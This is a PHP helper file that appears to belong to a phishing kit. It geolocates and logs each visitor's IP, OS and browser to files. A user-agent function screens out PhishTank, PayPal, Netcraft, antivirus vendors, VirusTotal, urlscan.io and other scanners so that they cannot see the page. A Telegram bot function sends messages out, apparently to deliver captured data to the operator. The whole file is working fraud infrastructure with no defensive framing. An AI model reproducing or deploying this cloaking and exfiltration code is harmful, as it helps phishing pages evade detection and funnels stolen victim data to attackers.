<?php
function location($ip) {
		$user_ip = $ip;
		$ch = curl_init();

        // set url
        curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/".$user_ip);

        //return the transfer as a string
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        // $output contains the output string
        $output = curl_exec($ch);

        // close curl resource to free up system resources
        curl_close($ch);
		$user_info = json_decode($output);
		
		return $user_info;
	}
function isIPv4InRange($ip, $range) {
    if (strpos($range, '-') !== false) {
        list($start, $end) = explode('-', $range);
        return ip2long($ip) >= ip2long($start) && ip2long($ip) <= ip2long($end);
    } elseif (strpos($range, '/') !== false) {
        list($subnet, $bits) = explode('/', $range);
        $subnet_long = ip2long($subnet);
        $ip_long = ip2long($ip);
        $mask = -1 << (32 - $bits);
        return ($ip_long & $mask) == ($subnet_long & $mask);
    } else {
        return $ip == $range;
    }
}

function isIPv6InRange($ip, $range) {
    list($subnet, $bits) = explode('/', $range);
    $ip_bin = inet_pton($ip);
    $subnet_bin = inet_pton($subnet);
    $ip_hex = bin2hex($ip_bin);
    $subnet_hex = bin2hex($subnet_bin);
    $ip_subnet_hex = substr($ip_hex, 0, intval($bits / 4));
    $subnet_subnet_hex = substr($subnet_hex, 0, intval($bits / 4));
    return $ip_subnet_hex === $subnet_subnet_hex;
}

function checkUA_bot($agent) {
	if (
    strpos($agent, "facebookexternalhit/1.1") === 0 ||
    strpos($agent, "facebookexternalhit/1.0") === 0 ||
    strpos($agent, "applebot") === 0 ||
    strpos($agent, "java") === 0 ||
    strpos($agent, "Media Center PC") === 0 ||
    strpos($agent, "PhantomJS") === 0 ||
    strpos($agent, "metauri.com") === 0 ||
    strpos($agent, "Twitterbot") === 0 ||
    strpos($agent, "above") === 0 ||
    strpos($agent, "google") === 0 ||
    strpos($agent, "softlayer") === 0 ||
    strpos($agent, "amazonaws") === 0 ||
    strpos($agent, "cyveillance") === 0 ||
    strpos($agent, "phishtank") === 0 ||
    strpos($agent, "dreamhost") === 0 ||
    strpos($agent, "netpilot") === 0 ||
    strpos($agent, "calyxinstitute") === 0 ||
    strpos($agent, "tor-exit") === 0 ||
    strpos($agent, "msnbot") === 0 ||
    strpos($agent, "p3pwgdsn") === 0 ||
    strpos($agent, "netcraft") === 0 ||
    strpos($agent, "trendmicro") === 0 ||
    strpos($agent, "ebay") === 0 ||
    strpos($agent, "paypal") === 0 ||
    strpos($agent, "torservers") === 0 ||
    strpos($agent, "messagelabs") === 0 ||
    strpos($agent, "PhishMe") === 0 ||
    strpos($agent, "sucuri.net") === 0 ||
    strpos($agent, "crawler") === 0 ||
    strpos($agent, "baidu") === 0 ||
    strpos($agent, "baidubot") === 0 ||
    strpos($agent, "Googlebot") === 0 ||
    strpos($agent, "Baiduspider") === 0 ||
    strpos($agent, "PhantomJS") === 0 ||
    strpos($agent, "applebot") === 0 ||
    strpos($agent, "metauri.com") === 0 ||
    strpos($agent, "Twitterbot") === 0 ||
    strpos($agent, "ia_archiver") === 0 ||
    strpos($agent, "R6_FeedFetcher") === 0 ||
    strpos($agent, "NetcraftSurveyAgent") === 0 ||
    strpos($agent, "Sogou web spider") === 0 ||
    strpos($agent, "bingbot") === 0 ||
    strpos($agent, "Yahoo! Slurp") === 0 ||
    strpos($agent, "facebookexternalhit") === 0 ||
    strpos($agent, "PrintfulBot") === 0 ||
    strpos($agent, "msnbot") === 0 ||
    strpos($agent, "Twitterbot") === 0 ||
    strpos($agent, "UnwindFetchor") === 0 ||
    strpos($agent, "urlresolver") === 0 ||
    strpos($agent, "Butterfly") === 0 ||
    strpos($agent, "TweetmemeBot") === 0 ||
    strpos($agent, "PaperLiBot") === 0 ||
    strpos($agent, "MJ12bot") === 0 ||
    strpos($agent, "AhrefsBot") === 0 ||
    strpos($agent, "Exabot") === 0 ||
    strpos($agent, "Ezooms") === 0 ||
    strpos($agent, "YandexBot") === 0 ||
    strpos($agent, "SearchmetricsBot") === 0 ||
    strpos($agent, "picsearch") === 0 ||
    strpos($agent, "TweetedTimes Bot") === 0 ||
    strpos($agent, "QuerySeekerSpider") === 0 ||
    strpos($agent, "ShowyouBot") === 0 ||
    strpos($agent, "woriobot") === 0 ||
    strpos($agent, "merlinkbot") === 0 ||
    strpos($agent, "BazQuxBot") === 0 ||
    strpos($agent, "Kraken") === 0 ||
    strpos($agent, "SISTRIX Crawler") === 0 ||
    strpos($agent, "R6_CommentReader") === 0 ||
    strpos($agent, "magpie-crawler") === 0 ||
    strpos($agent, "GrapeshotCrawler") === 0 ||
    strpos($agent, "PercolateCrawler") === 0 ||
    strpos($agent, "MaxPointCrawler") === 0 ||
    strpos($agent, "R6_FeedFetcher") === 0 ||
    strpos($agent, "NetSeer crawler") === 0 ||
    strpos($agent, "grokkit-crawler") === 0 ||
    strpos($agent, "SMXCrawler") === 0 ||
    strpos($agent, "PulseCrawler") === 0 ||
    strpos($agent, "Y!J-BRW") === 0 ||
    strpos($agent, "80legs.com/webcrawler") === 0 ||
    strpos($agent, "Mediapartners-Google") === 0 ||
    strpos($agent, "Spinn3r") === 0 ||
    strpos($agent, "InAGist") === 0 ||
    strpos($agent, "Python-urllib") === 0 ||
    strpos($agent, "NING") === 0 ||
    strpos($agent, "TencentTraveler") === 0 ||
    strpos($agent, "Feedfetcher-Google") === 0 ||
    strpos($agent, "mon.itor.us") === 0 ||
    strpos($agent, "spbot") === 0 ||
    strpos($agent, "Feedly") === 0 ||
    strpos($agent, "bot") === 0 ||
    strpos($agent, "googlebot") === 0 ||
    strpos($agent, "BlackWidow") === 0 ||
    strpos($agent, "ChinaClaw") === 0 ||
    strpos($agent, "Custo") === 0 ||
    strpos($agent, "DISCo") === 0 ||
    strpos($agent, "Download\ Demon") === 0 ||
    strpos($agent, "eCatch") === 0 ||
    strpos($agent, "EirGrabber") === 0 ||
    strpos($agent, "EmailSiphon") === 0 ||
    strpos($agent, "EmailWolf") === 0 ||
    strpos($agent, "Express\ WebPictures") === 0 ||
    strpos($agent, "ExtractorPro") === 0 ||
    strpos($agent, "EyeNetIE") === 0 ||
    strpos($agent, "FlashGet") === 0 ||
    strpos($agent, "GetRight") === 0 ||
    strpos($agent, "GetWeb!") === 0 ||
    strpos($agent, "Go!Zilla") === 0 ||
    strpos($agent, "Go-Ahead-Got-It") === 0 ||
    strpos($agent, "GrabNet") === 0 ||
    strpos($agent, "Grafula") === 0 ||
    strpos($agent, "HMView") === 0 ||
    strpos($agent, "HTTrack") === 0 ||
    strpos($agent, "Image\ Stripper") === 0 ||
    strpos($agent, "Image\ Sucker") === 0 ||
    strpos($agent, "Indy\ Library") === 0 ||
    strpos($agent, "InterGET") === 0 ||
    strpos($agent, "Internet\ Ninja") === 0 ||
    strpos($agent, "JetCar") === 0 ||
    strpos($agent, "JOC\ Web\ Spider") === 0 ||
    strpos($agent, "larbin") === 0 ||
    strpos($agent, "LeechFTP") === 0 ||
    strpos($agent, "Mass\ Downloader") === 0 ||
    strpos($agent, "MIDown\ tool") === 0 ||
    strpos($agent, "Mister\ PiX") === 0 ||
    strpos($agent, "Navroad") === 0 ||
    strpos($agent, "NearSite") === 0 ||
    strpos($agent, "NetAnts") === 0 ||
    strpos($agent, "NetSpider") === 0 ||
    strpos($agent, "Net\ Vampire") === 0 ||
    strpos($agent, "NetZIP") === 0 ||
    strpos($agent, "Octopus") === 0 ||
    strpos($agent, "Offline\ Explorer") === 0 ||
    strpos($agent, "Offline\ Navigator") === 0 ||
    strpos($agent, "PageGrabber") === 0 ||
    strpos($agent, "Papa\ Foto") === 0 ||
    strpos($agent, "pavuk") === 0 ||
    strpos($agent, "pcBrowser") === 0 ||
    strpos($agent, "RealDownload") === 0 ||
    strpos($agent, "ReGet") === 0 ||
    strpos($agent, "SiteSnagger") === 0 ||
    strpos($agent, "SmartDownload") === 0 ||
    strpos($agent, "SuperBot") === 0 ||
    strpos($agent, "SuperHTTP") === 0 ||
    strpos($agent, "Surfbot") === 0 ||
    strpos($agent, "tAkeOut") === 0 ||
    strpos($agent, "Teleport\ Pro") === 0 ||
    strpos($agent, "VoidEYE") === 0 ||
    strpos($agent, "Web\ Image\ Collector") === 0 ||
    strpos($agent, "Web\ Sucker") === 0 ||
    strpos($agent, "WebAuto") === 0 ||
    strpos($agent, "WebCopier") === 0 ||
    strpos($agent, "WebFetch") === 0 ||
    strpos($agent, "WebGo\ IS") === 0 ||
    strpos($agent, "WebLeacher") === 0 ||
    strpos($agent, "WebReaper") === 0 ||
    strpos($agent, "WebSauger") === 0 ||
    strpos($agent, "Website\ eXtractor") === 0 ||
    strpos($agent, "Website\ Quester") === 0 ||
    strpos($agent, "WebStripper") === 0 ||
    strpos($agent, "WebWhacker") === 0 ||
    strpos($agent, "WebZIP") === 0 ||
    strpos($agent, "Wget") === 0 ||
    strpos($agent, "Widow") === 0 ||
    strpos($agent, "WWWOFFLE") === 0 ||
    strpos($agent, "Xaldon\ WebSpider") === 0 ||
    strpos($agent, "Zeus") === 0 ||
    strpos($agent, "java") === 0 ||
    strpos($agent, "curl") === 0 ||
    strpos($agent, "spider") === 0 ||
    strpos($agent, "crawler") === 0 ||
    strpos($agent, "Google") === 0 ||
    strpos($agent, "msnbot") === 0 ||
    strpos($agent, "Rambler") === 0 ||
    strpos($agent, "Yahoo") === 0 ||
    strpos($agent, "AbachoBOT") === 0 ||
    strpos($agent, "Accoona") === 0 ||
    strpos($agent, "AcoiRobot") === 0 ||
    strpos($agent, "ASPSeek") === 0 ||
    strpos($agent, "CrocCrawler") === 0 ||
    strpos($agent, "Dumbot") === 0 ||
    strpos($agent, "FAST-WebCrawler") === 0 ||
    strpos($agent, "GeonaBot") === 0 ||
    strpos($agent, "Lycos") === 0 ||
    strpos($agent, "MSRBOT") === 0 ||
    strpos($agent, "Scooter") === 0 ||
    strpos($agent, "Altavista") === 0 ||
    strpos($agent, "IDBot") === 0 ||
    strpos($agent, "eStyle") === 0 ||
    strpos($agent, "Scrubby") === 0 ||
    strpos($agent, "facebookexternalhit") === 0 ||
    strpos($agent, "alexa") === 0 ||
    strpos($agent, "twitter") === 0 ||
    strpos($agent, "crawler") === 0 ||
    strpos($agent, "bot") === 0 ||
    strpos($agent, "spider") === 0 ||
    strpos($agent, "curl") === 0 ||
    strpos($agent, "AVG") === 0 ||
    strpos($agent, "Norton") === 0 ||
    strpos($agent, "McAfee") === 0 ||
    strpos($agent, "AVAST") === 0 ||
    strpos($agent, "AVG") === 0 ||
    strpos($agent, "TrendMicro") === 0 ||
    strpos($agent, "Symantec") === 0 ||
    strpos($agent, "Kaspersky") === 0 ||
    strpos($agent, "ESET") === 0 ||
    strpos($agent, "Bitdefender") === 0 ||
    strpos($agent, "Avira") === 0 ||
    strpos($agent, "AVIRA") === 0 ||
    strpos($agent, "F-Secure") === 0 ||
    strpos($agent, "Dr.Web") === 0 ||
    strpos($agent, "Microsoft") === 0 ||
    strpos($agent, "Windows-Security") === 0 ||
    strpos($agent, "ClamAV") === 0 ||
    strpos($agent, "Zemana") === 0 ||
    strpos($agent, "Malwarebytes") === 0 ||
    strpos($agent, "OpenAI") === 0 ||
    strpos($agent, "Sophos") === 0 ||
    strpos($agent, "Virusdie") === 0 ||
    strpos($agent, "Comodo") === 0 ||
    strpos($agent, "Panda") === 0 ||
    strpos($agent, "Webroot") === 0 ||
    strpos($agent, "SonicWall") === 0 ||
    strpos($agent, "Trustwave") === 0 ||
    strpos($agent, "Web Inspector") === 0 ||
    strpos($agent, "Anti-Phishing Working Group") === 0 ||
    strpos($agent, "PhishWall") === 0 ||
    strpos($agent, "PhishLabs") === 0 ||
    strpos($agent, "Quttera") === 0 ||
    strpos($agent, "VirusTotal") === 0 ||
    strpos($agent, "VirusTotalScanner") === 0 ||
    strpos($agent, "VirusTotalUploader") === 0 ||
    strpos($agent, "urlscan.io") === 0 ||
    strpos($agent, "Hybrid-Analysis") === 0 ||
    strpos($agent, "Jotti") === 0 ||
    strpos($agent, "Metascan Online") === 0 ||
    strpos($agent, "NoVirusThanks") === 0 ||
    strpos($agent, "ThreatExpert") === 0 ||
    strpos($agent, "VXVault") === 0 ||
    strpos($agent, "Web of Trust") === 0 ||
    strpos($agent, "Websense") === 0 ||
    strpos($agent, "Wepawet") === 0
) {
    return false;
} else {
	return true;
}
}

function sendToTelegram2( $messaggio, $token, $chatID) {
$data = [
    'text' => $messaggio,
    'chat_id' => $chatID
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}



function clicks($ip, $os, $browser, $status, $file_name) {
	$dateNow = date("d/m/Y h:i:s A");
	$_SESSION['os']             = $os;
	$_SESSION['browser']        = $browser;
	$code    = "{$ip} | {$dateNow} | {$_SESSION['os']} | {$_SESSION['browser']} | STATUS: {$status}\r\n";
	$save    = fopen($file_name, "a+");
	fwrite($save, $code);
	fclose($save);
}

function visitor($ip) {
	$dateNow = date("d/m/Y h:i:s A");
	$code    = "{$ip} | {$dateNow}\r\n";
	$save    = fopen("secrets/visitors.txt", "a+");
	fwrite($save, $code);
	fclose($save);
}

function browsername()
{
    $browserName = $_SERVER['HTTP_USER_AGENT'];

    if (strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "opr/")) {
        $browserName = "Opera";
    } elseif (strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "chrome/")) {
        $browserName = "Chrome";
    } elseif (strpos(strtolower($browserName), "msie")) {
        $browserName = "Internet Explorer";
    } elseif (strpos(strtolower($browserName), "firefox/")) {
        $browserName = "Firefox";
    } elseif (strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "opr/")==false and strpos(strtolower($browserName), "chrome/")==false) {
        $browserName = "Safari";
    } else { $browserName = "Unknown"; }

    return $browserName;
}

function os_info($uagent)
{
    // the order of this array is important
    global $uagent;
    $oses   = array(
        'Win311' => 'Win16',
        'Win95' => '(Windows 95)|(Win95)|(Windows_95)',
        'WinME' => '(Windows 98)|(Win 9x 4.90)|(Windows ME)',
        'Win98' => '(Windows 98)|(Win98)',
        'Win2000' => '(Windows NT 5.0)|(Windows 2000)',
        'WinXP' => '(Windows NT 5.1)|(Windows XP)',
        'WinServer2003' => '(Windows NT 5.2)',
        'WinVista' => '(Windows NT 6.0)',
        'Windows 7' => '(Windows NT 6.1)',
        'Windows 8' => '(Windows NT 6.2)',
        'WinNT' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
        'OpenBSD' => 'OpenBSD',
        'SunOS' => 'SunOS',
        'Ubuntu' => 'Ubuntu',
        'Android' => 'Android',
        'Linux' => '(Linux)|(X11)',
        'iPhone' => 'iPhone',
        'iPad' => 'iPad',
        'MacOS' => '(Mac_PowerPC)|(Macintosh)',
        'QNX' => 'QNX',
        'BeOS' => 'BeOS',
        'OS2' => 'OS/2',
        'SearchBot' => '(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(MSNBot)|(Ask Jeeves/Teoma)|(ia_archiver)'
    );
    $uagent = strtolower($uagent ? $uagent : $_SERVER['HTTP_USER_AGENT']);
    foreach ($oses as $os => $pattern)
        if (preg_match('/' . $pattern . '/i', $uagent))
            return $os;
    return 'Unknown';
}

function systemInfo($ipAddress) {
    $systemInfo = array();

    $ipDetails = json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=" . $ipAddress), true);
    $systemInfo['city'] = $ipDetails['geoplugin_city'];
    $systemInfo['region'] = $ipDetails['geoplugin_region'];
    $systemInfo['country'] = $ipDetails['geoplugin_countryName'];

    $systemInfo['useragent'] = $_SERVER['HTTP_USER_AGENT'];
    $systemInfo['os'] = os_info($systemInfo['useragent']);
    $systemInfo['browser'] = browsername();

    return $systemInfo;
}





function getOs()
{
    $os_platform = "Unknown OS";
    $all         = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );
    foreach ($all as $regex => $value) {
        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
            $os_platform = $value;
        }
    }
    return $os_platform;
}
function getBrowser()
{
    $browser = "Unknown Browser";
    $all     = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );
    foreach ($all as $regex => $value) {
        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
            $browser = $value;
        }
    }
    return $browser;
}


?>